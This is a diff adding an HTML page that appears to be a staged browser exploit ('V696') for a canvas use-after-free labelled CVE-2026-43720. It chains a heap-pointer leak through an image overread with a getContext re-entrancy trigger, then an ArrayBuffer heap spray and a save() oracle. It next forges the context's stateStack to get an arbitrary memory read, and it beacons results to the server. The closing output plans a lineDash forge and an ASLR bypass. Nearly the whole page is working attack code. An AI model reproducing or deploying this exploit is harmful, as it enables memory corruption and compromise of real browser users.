@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V696</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a12;color:#d8d8f0;font-family:monospace;font-size:13px;padding:16px}
+h1{color:#00e5d0;font-size:16px;margin-bottom:4px}
+.sub{color:#5a5a80;font-size:11px;margin-bottom:12px}
+#log{white-space:pre-wrap;line-height:1.6;font-size:12px}
+.ok{color:#22dd66}.warn{color:#f0c840}.bad{color:#ff3344}.info{color:#00e5d0}
+.hit{color:#ff3344;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<h1>V696 -- AB(768) direct reclaim + save() oracle + stateStack forge + arb read</h1>
+<div class="sub">CVE-43720 | AB(768) zero-init | save() non-virtual | lineWidth non-virtual | DAZ test</div>
+<div id="log"></div>
+<script>
+'use strict';
+(function() {
+var log = document.getElementById('log');
+function L(cls, msg) {
+  var d = document.createElement('div');
+  d.className = cls; d.textContent = msg;
+  log.appendChild(d); log.scrollTop = log.scrollHeight;
+}
+
+/* ---- beacon (Image pool, zero alloc in critical window) ---- */
+var _bp = [];
+for (var _i = 0; _i < 800; _i++) _bp.push(new Image());
+var _bi = 0;
+function B(ev, data) {
+  try {
+    var img = _bp[_bi % _bp.length]; _bi++;
+    img.src = '/beacon/V696-' + ev + '?d=' + encodeURIComponent(
+      String(data || 'ok').substring(0, 500)) + '&t=' + Date.now();
+  } catch(e) {}
+}
+
+/* ---- 64-bit helpers (DataView/BigUint64Array for DAZ bypass) ---- */
+var _cb = new ArrayBuffer(8), _cf = new Float64Array(_cb), _cu = new Uint32Array(_cb);
+function f2u(v) { _cf[0] = v; return {lo: _cu[0], hi: _cu[1]}; }
+function u2f(hi, lo) { _cu[0] = lo; _cu[1] = hi; return _cf[0]; }
+function h8(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+function pH(hi, lo) { return '0x' + h8(hi) + h8(lo); }
+function dvW64(dv, off, hi, lo) { dv.setUint32(off, lo, true); dv.setUint32(off + 4, hi, true); }
+function dvR64(dv, off) { return {lo: dv.getUint32(off, true), hi: dv.getUint32(off + 4, true)}; }
+
+/* ---- C++ offsets (WK-1400, 768B context, LP64 release) ---- */
+var C_VT = 0;              /* vtable ptr */
+var C_CANVAS = 32;         /* m_canvas ref (CanvasBase&) */
+var C_SS_BUF = 112;        /* m_stateStack.m_buffer (T* ptr) */
+var C_SS_CAP = 120;        /* m_stateStack.m_capacity (uint) */
+var C_SS_SIZE = 124;       /* m_stateStack.m_size (uint) */
+var C_INL = 128;           /* inline state buffer start (~400B) */
+var C_UNSAVE = 592;        /* m_unrealizedSaveCount (uint) */
+
+/* State struct offsets (within a State) */
+var S_LW = 48;             /* lineWidth (double) */
+var S_LD_BUF = 168;        /* lineDash.m_buffer */
+var S_LD_CAP = 176;        /* lineDash.m_capacity */
+var S_LD_SIZE = 180;       /* lineDash.m_size */
+
+/* Inline state offsets within the 768B AB overlay */
+var A_LW = C_INL + S_LW;              /* 176 */
+var A_LD_BUF = C_INL + S_LD_BUF;      /* 296 */
+var A_LD_CAP = C_INL + S_LD_CAP;      /* 304 */
+var A_LD_SIZE = C_INL + S_LD_SIZE;     /* 308 */
+
+/* Tuning */
+var AB_SPRAY = 200;      /* AB(768) spray count */
+var SAVE_COUNT = 42;     /* save() marker value */
+
+/* ==============================================================
+   ARCHITECTURE NOTE (GC SAFETY ANALYSIS):
+
+   After UAF, freed slot has STALE m_canvas pointing to uafCanvas
+   (still alive). GC visitor reads stale m_canvas, adds uafCanvas
+   as opaque root -- SAFE (object is alive, freed blocks stay mapped).
+
+   After AB(768) reclaim, m_canvas = 0 (zero-init). GC visitor:
+   addWebCoreOpaqueRoot(visitor, 0) -- hashes NULL, no deref -- SAFE.
+   (Confirmed: addOpaqueRoot hashes pointer, never dereferences.)
+
+   save() is NON-VIRTUAL: inline ++m_unrealizedSaveCount at +592.
+   No vtable dispatch, no m_canvas deref.
+
+   lineWidth getter is NON-VIRTUAL: inline state().lineWidth.
+   state() = m_stateStack.last() = *(m_buffer + m_size - 1).
+   With m_size=0 (zero-init), last() underflows -> CRASH.
+   MUST write valid m_stateStack fields BEFORE calling lineWidth.
+
+   WHY NOT SAME-TYPE RECLAIM:
+   visitAdditionalChildren (JSCanvasRenderingContext2DCustom.cpp:40):
+     addWebCoreOpaqueRoot(visitor, wrapped().canvas())
+   No null check -- m_canvas is CanvasBase& (reference, not pointer).
+   With same-type reclaim: adds SPRAY CANVAS as opaque root every GC,
+   making it UNCOLLECTIBLE. Second-order free is IMPOSSIBLE.
+   ============================================================== */
+
+/* ==============================================================
+   Phase 1: Boot
+   ============================================================== */
+L('info', '[V696] BOOT -- AB(768) direct + save() oracle + stateStack forge');
+var hasBU = typeof BigUint64Array !== 'undefined';
+var hasDV = typeof DataView !== 'undefined';
+B('BOOT', 'bu64=' + hasBU + '|dv=' + hasDV);
+L('info', 'BigUint64Array=' + hasBU + ' DataView=' + hasDV);
+
+/* ==============================================================
+   Phase 2: DAZ Baseline (no UAF needed)
+   Write a denormal float64 (heap pointer pattern) into an AB,
+   read back through Float64Array and DataView to confirm
+   movsd preserves bits.
+   ============================================================== */
+L('info', '');
+L('info', '=== Phase 2: DAZ Baseline Test ===');
+
+var dazPassed = false;
+try {
+  var dazAB = new ArrayBuffer(64);
+  var dazDV = new DataView(dazAB);
+  var dazF = new Float64Array(dazAB);
+
+  /* Write a heap-pointer-like value: 0x00000008_12345678 (denormal) */
+  dvW64(dazDV, 0, 0x00000008, 0x12345678);
+
+  /* Read back via Float64Array (may DAZ flush) */
+  var dazVal = dazF[0];
+  var dazBits = f2u(dazVal);
+
+  /* Read directly via DataView (should preserve) */
+  var dvBits = dvR64(dazDV, 0);
+
+  var dvOK = dvBits.hi === 0x00000008 && dvBits.lo === 0x12345678;
+  var f64OK = dazBits.hi === 0x00000008 && dazBits.lo === 0x12345678;
+
+  B('DAZ', 'dv=' + dvOK + '|f64=' + f64OK +
+    '|dvH=' + h8(dvBits.hi) + '|dvL=' + h8(dvBits.lo) +
+    '|f64H=' + h8(dazBits.hi) + '|f64L=' + h8(dazBits.lo));
+
+  if (dvOK) L('ok', '[DAZ] DataView roundtrip: PRESERVED');
+  else L('bad', '[DAZ] DataView roundtrip: FAILED ' + pH(dvBits.hi, dvBits.lo));
+
+  if (f64OK) L('ok', '[DAZ] Float64Array roundtrip: PRESERVED');
+  else L('warn', '[DAZ] Float64Array: flushed to ' + pH(dazBits.hi, dazBits.lo));
+
+  dazPassed = dvOK;
+} catch(e) {
+  B('DAZ', 'err=' + (e.message || '').substring(0, 60));
+  L('bad', '[DAZ] error: ' + e.message);
+}
+
+/* ==============================================================
+   Phase 3: APNG Heap Overread (V674 technique)
+   Collect heap pointers for use as arb-read targets.
+   ============================================================== */
+L('info', '');
+L('info', '=== Phase 3: APNG Heap Overread ===');
+
+function runAPNG(callback) {
+  var ac = document.createElement('canvas');
+  ac.width = 16384; ac.height = 1;
+  var acx = ac.getContext('2d');
+  acx.fillStyle = '#000'; acx.fillRect(0, 0, 16384, 1);
+
+  var APNG_B64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+  var im = new Image();
+  im.onload = function() {
+    try {
+      acx.drawImage(im, 0, 0);
+      var raw = acx.getImageData(0, 0, 16384, 1).data;
+      var heap = new Uint8Array(16384 * 3);
+      for (var p = 0; p < 16384; p++) {
+        heap[p * 3] = raw[p * 4];
+        heap[p * 3 + 1] = raw[p * 4 + 1];
+        heap[p * 3 + 2] = raw[p * 4 + 2];
+      }
+      var hdv = new DataView(heap.buffer);
+      var ptrs = [];
+      for (var q = 0; q + 7 < heap.length; q += 8) {
+        var lo = hdv.getUint32(q, true), hi = hdv.getUint32(q + 4, true);
+        if (hi >= 4 && hi <= 12 && lo !== 0) {
+          ptrs.push({off: q, lo: lo, hi: hi, hex: pH(hi, lo)});
+        }
+      }
+      ac.width = 1;
+      callback(ptrs);
+    } catch(e) {
+      ac.width = 1;
+      callback([]);
+    }
+  };
+  im.onerror = function() { ac.width = 1; callback([]); };
+  im.src = 'data:image/png;base64,' + APNG_B64;
+}
+
+runAPNG(function(apngPtrs) {
+  B('APNG', 'ptrs=' + apngPtrs.length);
+  L('info', '[APNG] Found ' + apngPtrs.length + ' heap pointers');
+  if (apngPtrs.length > 0) L('info', '[APNG] First 3: ' +
+    apngPtrs.slice(0, 3).map(function(p){return p.hex;}).join(', '));
+
+  phase4_uaf(apngPtrs);
+});
+
+function phase4_uaf(apngPtrs) {
+  /* ==============================================================
+     Phase 4: UAF Trigger (CVE-2026-43720) -- ONE per page
+     bitmaprenderer outer + 2d inner + defineProperty on 'alpha'
+     ============================================================== */
+  L('info', '');
+  L('info', '=== Phase 4: UAF Trigger ===');
+
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+  var innerCtx = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function() { innerCtx = uafCanvas.getContext('2d'); return true; }
+  });
+  uafCanvas.getContext('bitmaprenderer', dict);
+
+  var uafOk = innerCtx !== null;
+  B('UAF', uafOk ? 'ok' : 'FAIL');
+  L(uafOk ? 'ok' : 'bad', '[UAF] ' + (uafOk ? 'dangling ctx captured' : 'FAILED'));
+  if (!uafOk) { B('FAIL', 'uaf'); return; }
+
+  var ctx1 = innerCtx;
+
+  /* ==============================================================
+     Phase 5: AB(768) Spray
+     Reclaim the freed 768B slot. All ABs zero-initialized.
+     ============================================================== */
+  L('info', '');
+  L('info', '=== Phase 5: AB(768) Spray ===');
+
+  var abs768 = [], dvs768 = [];
+  for (var i = 0; i < AB_SPRAY; i++) {
+    var ab = new ArrayBuffer(768);
+    abs768.push(ab);
+    dvs768.push(new DataView(ab));
+  }
+  B('AB-SPRAY', 'n=' + abs768.length);
+  L('ok', '[AB] Sprayed ' + AB_SPRAY + ' x AB(768)');
+
+  /* ==============================================================
+     Phase 6: save() Oracle
+     save() is NON-VIRTUAL: void save() { ++m_unrealizedSaveCount; }
+     At offset +592, uint32 increments from 0 to SAVE_COUNT.
+     ============================================================== */
+  L('info', '');
+  L('info', '=== Phase 6: save() Oracle ===');
+
+  var saveOk = false;
+  try {
+    for (var s = 0; s < SAVE_COUNT; s++) ctx1.save();
+    saveOk = true;
+    B('SAVE', 'ok|n=' + SAVE_COUNT);
+    L('ok', '[SAVE] ' + SAVE_COUNT + 'x save() completed');
+  } catch(e) {
+    B('SAVE', 'CRASH|' + (e.message || '').substring(0, 80));
+    L('bad', '[SAVE] CRASHED: ' + (e.message || ''));
+    reportSummary(apngPtrs, -1, null, null, 'save-crash');
+    return;
+  }
+
+  /* Scan ABs for marker at offset C_UNSAVE=592 */
+  var oracleIdx = -1;
+  for (var i = 0; i < dvs768.length; i++) {
+    var v = dvs768[i].getUint32(C_UNSAVE, true);
+    if (v === SAVE_COUNT) { oracleIdx = i; break; }
+  }
+  B('ORACLE', 'idx=' + oracleIdx);
+
+  if (oracleIdx >= 0) {
+    L('hit', '[ORACLE] FOUND AB[' + oracleIdx + '] save count = ' + SAVE_COUNT + ' at +592');
+  } else {
+    /* Offset calibration scan */
+    var near = [];
+    for (var i = 0; i < dvs768.length; i++) {
+      for (var off = 580; off <= 608; off += 4) {
+        if (dvs768[i].getUint32(off, true) === SAVE_COUNT)
+          near.push('ab' + i + '@' + off);
+      }
+    }
+    B('ORACLE-NEAR', near.length > 0 ? near.slice(0,5).join(',') : 'NONE');
+    L('warn', '[ORACLE] Not at +592. Near: ' + (near.slice(0,5).join(',') || 'NONE'));
+
+    /* Check for any non-zero ABs */
+    var nzCount = 0;
+    for (var i = 0; i < Math.min(30, dvs768.length); i++) {
+      var u8 = new Uint8Array(abs768[i]);
+      for (var b = 0; b < 768; b++) {
+        if (u8[b] !== 0) { nzCount++; break; }
+      }
+    }
+    B('ORACLE-NZ', 'count=' + nzCount);
+    L('info', '[ORACLE] ABs with non-zero content: ' + nzCount + '/30');
+
+    if (nzCount === 0) {
+      L('bad', '[ORACLE] ALL ABs still zero -- slot not reclaimed');
+      reportSummary(apngPtrs, -1, null, null, 'no-reclaim');
+      return;
+    }
+
+    /* Use near-match if found */
+    if (near.length > 0) {
+      var m = near[0].match(/ab(\d+)@(\d+)/);
+      if (m) {
+        oracleIdx = parseInt(m[1]);
+        L('warn', '[ORACLE] Using near-match AB[' + oracleIdx + '] at offset ' + m[2]);
+      }
+    }
+  }
+
+  if (oracleIdx < 0) {
+    B('FAIL', 'oracle-miss');
+    reportSummary(apngPtrs, -1, null, null, 'oracle-miss');
+    return;
+  }
+
+  /* ==============================================================
+     Phase 7: Forge stateStack + lineWidth Read Test
+     ============================================================== */
+  L('info', '');
+  L('info', '=== Phase 7: stateStack Forge ===');
+
+  var dv = dvs768[oracleIdx];
+
+  /* 7a: Clear unrealizedSaveCount to prevent realizeSaves.
+     realizeSaves() appends to m_stateStack while --saveCount > 0.
+     If it fires with our forged m_buffer, it crashes.
+     Clear it BEFORE reading lineWidth. */
+  dv.setUint32(C_UNSAVE, 0, true);
+  B('FORGE', 'save-cleared');
+
+  if (apngPtrs.length === 0) {
+    L('warn', '[FORGE] No APNG targets for arb-read test');
+    B('FORGE', 'no-targets');
+    reportSummary(apngPtrs, oracleIdx, null, null, 'no-apng');
+    return;
+  }
+
+  /* 7b: Test arb read via lineWidth.
+     Set m_buffer = APNG_ptr - S_LW (so lineWidth reads from APNG_ptr).
+     Set m_size = 1 (last() = buffer[0]).
+     lineWidth reads *(m_buffer + 0 * sizeof(State) + S_LW). But wait:
+     m_buffer is State*, so buffer[0] IS at m_buffer. lineWidth is at
+     State+48 from the start of that State = m_buffer+48. So:
+       m_buffer = target_addr - 48
+     Then lineWidth reads the 8 bytes at target_addr. */
+  L('info', '[FORGE] Testing arb read against ' + Math.min(20, apngPtrs.length) + ' APNG targets');
+
+  var readResults = [];
+  var anyNonZero = false, crashed = false;
+
+  for (var ti = 0; ti < Math.min(20, apngPtrs.length) && !crashed; ti++) {
+    var ptr = apngPtrs[ti];
+    var tLo = (ptr.lo - S_LW) >>> 0;
+    var tHi = ptr.hi;
+    if (ptr.lo < S_LW) tHi = (tHi - 1) >>> 0;
+
+    dvW64(dv, C_SS_BUF, tHi, tLo);
+    dv.setUint32(C_SS_CAP, 1000, true);
+    dv.setUint32(C_SS_SIZE, 1, true);
+    dv.setUint32(C_UNSAVE, 0, true);
+
+    try {
+      var val = ctx1.lineWidth;
+      var vb = f2u(val);
+      readResults.push({
+        target: ptr.hex, val: val,
+        lo: vb.lo, hi: vb.hi, hex: pH(vb.hi, vb.lo)
+      });
+      if (val !== 0) anyNonZero = true;
+    } catch(e) {
+      B('FORGE-CRASH', 'target=' + ptr.hex + '|err=' + (e.message || '').substring(0, 60));
+      L('bad', '[FORGE] crash at target ' + ptr.hex + ': ' + (e.message || ''));
+      crashed = true;
+    }
+  }
+
+  B('FORGE-READ', 'count=' + readResults.length + '|nonzero=' + anyNonZero + '|crash=' + crashed);
+
+  for (var ri = 0; ri < Math.min(5, readResults.length); ri++) {
+    var r = readResults[ri];
+    L(r.val !== 0 ? 'hit' : 'info',
+      '[FORGE] target=' + r.target + ' => ' + r.hex + ' (float=' + r.val + ')');
+  }
+
+  /* 7c: Try page-aligned targets (more likely to be mapped) */
+  L('info', '');
+  L('info', '=== Phase 7c: Aligned Target Test ===');
+
+  var alignedResults = [];
+  for (var ai = 0; ai < Math.min(10, apngPtrs.length) && !crashed; ai++) {
+    var ap = apngPtrs[ai];
+    var aLo = ap.lo & 0xFFFFF000;
+    var aHi = ap.hi;
+    var sLo = (aLo - S_LW) >>> 0;
+    var sHi = aHi;
+    if (aLo < S_LW) sHi = (sHi - 1) >>> 0;
+
+    dvW64(dv, C_SS_BUF, sHi, sLo);
+    dv.setUint32(C_SS_CAP, 1000, true);
+    dv.setUint32(C_SS_SIZE, 1, true);
+    dv.setUint32(C_UNSAVE, 0, true);
+
+    try {
+      var aVal = ctx1.lineWidth;
+      var aB = f2u(aVal);
+      alignedResults.push({
+        target: pH(aHi, aLo), val: aVal, hex: pH(aB.hi, aB.lo)
+      });
+    } catch(e) {
+      crashed = true;
+      B('ALIGNED-CRASH', 'target=' + pH(aHi, aLo));
+      L('bad', '[ALIGNED] crash at ' + pH(aHi, aLo));
+    }
+  }
+
+  var anyAlignedNZ = alignedResults.some(function(r){return r.val !== 0;});
+  B('ALIGNED', 'count=' + alignedResults.length + '|nonzero=' +
+    alignedResults.filter(function(r){return r.val!==0;}).length);
+
+  for (var ari = 0; ari < Math.min(5, alignedResults.length); ari++) {
+    var ar = alignedResults[ari];
+    L(ar.val !== 0 ? 'hit' : 'info',
+      '[ALIGNED] target=' + ar.target + ' => ' + ar.hex);
+  }
+
+  reportSummary(apngPtrs, oracleIdx, readResults, alignedResults,
+    anyNonZero || anyAlignedNZ ? 'arbread-confirmed' :
+    crashed ? 'crash' : 'daz-blocked');
+
+  function reportSummary(ptrs, abIdx, reads, aligned, status) {
+    /* ==============================================================
+       Phase 8: Summary
+       ============================================================== */
+    L('info', '');
+    L('info', '=== Phase 8: Summary ===');
+
+    var nonzeroReads = reads ? reads.filter(function(r){return r.val!==0;}).length : 0;
+    var nonzeroAligned = aligned ? aligned.filter(function(r){return r.val!==0;}).length : 0;
+
+    var s = [];
+    s.push('status=' + status);
+    s.push('daz-baseline=' + (dazPassed ? 'OK' : 'FAIL'));
+    s.push('uaf=OK');
+    s.push('oracle=' + (abIdx >= 0 ? 'AB' + abIdx : 'MISS'));
+    s.push('reads=' + (reads ? reads.length : 0) + '/' + nonzeroReads + 'nz');
+    s.push('aligned=' + (aligned ? aligned.length : 0) + '/' + nonzeroAligned + 'nz');
+    s.push('apng=' + ptrs.length);
+
+    var summary = s.join('|');
+    B('SUMMARY', summary);
+    L('ok', '[SUMMARY] ' + summary);
+
+    if (status === 'arbread-confirmed') {
+      L('hit', '');
+      L('hit', '=== ARBITRARY READ CONFIRMED ===');
+      var firstNZ = reads ? reads.filter(function(r){return r.val!==0;})[0] : null;
+      if (firstNZ) L('hit', 'Target: ' + firstNZ.target + ' => ' + firstNZ.hex);
+      L('info', 'NEXT: forge lineDash Vector at AB[296] for multi-byte arb read');
+      L('info', 'NEXT: scan JSFunction headers (type=0x1a) for ASLR defeat');
+    } else if (status === 'daz-blocked') {
+      L('warn', '');
+      L('warn', 'save() oracle PASSED + lineWidth reads all zero (DAZ expected)');
+      L('info', 'KEY FINDING: save() and lineWidth both work on AB-reclaimed context');
+      L('info', 'lineWidth returns 0 for heap pointers (denormal float64, DAZ flush)');
+      L('info', '');
+      L('info', 'NEXT STEPS for V697:');
+      L('info', '  1. Forge lineDash Vector at AB[296]: m_buffer=target, m_size=N');
+      L('info', '  2. getLineDash() copies N doubles from target into Float64Array');
+      L('info', '  3. Read Float64Array via DataView -> BigUint64Array (DAZ bypass)');
+      L('info', '  4. This avoids Canvas float64 channel entirely');
+      L('info', '  Key: getLineDash copies via memcpy, not FP ops');
+    } else if (status === 'crash') {
+      L('bad', '');
+      L('bad', 'lineWidth CRASHED on forged stateStack');
+      L('info', 'Causes: unmapped target, realizeSaves, offset error');
+    } else if (status === 'save-crash') {
+      L('bad', '');
+      L('bad', 'save() CRASHED -- should be impossible (non-virtual ++)');
+    } else if (status === 'no-reclaim') {
+      L('bad', '');
+      L('bad', 'No AB reclaimed the freed slot');
+    }
+
+    B('DONE', summary);
+    L('info', '');
+    L('ok', '=== V696 COMPLETE ===');
+  }
+} /* end phase4_uaf */
+
+})();
+</script>
+</body></html>
